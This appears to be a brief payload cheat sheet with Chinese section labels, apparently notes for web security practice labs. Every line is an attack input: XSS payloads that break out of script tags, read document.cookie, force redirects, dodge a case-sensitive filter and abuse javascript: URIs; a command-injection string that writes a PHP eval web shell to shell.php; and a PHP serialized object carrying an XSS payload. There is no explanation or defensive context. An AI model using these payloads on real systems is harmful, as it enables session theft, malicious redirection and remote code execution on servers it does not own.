xss-js:
'</script><script>alert(1)</script>


xss-post:
<script>alert(document.cookie)</script>



<script>alert(document.cookie)</script>

<script type="text/javascript">window.location.href="跳转的目的地址";</script>
<script type="text/javascript">window.location.replace("跳转的目的地址");</script>
<script type="text/javascript">window.location.assign("跳转的目的地址");</script>


xss-过滤：
<SCript>alert(123)</SCRipt>
xss-htmlspecialchars:
javascript:alert(1)
xss-href输出:
javascript:alert(1)



rce:
`127.0.0.1 | echo "<?php @eval(\$_REQUEST[123])?>" > shell.php`
php反序列化
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}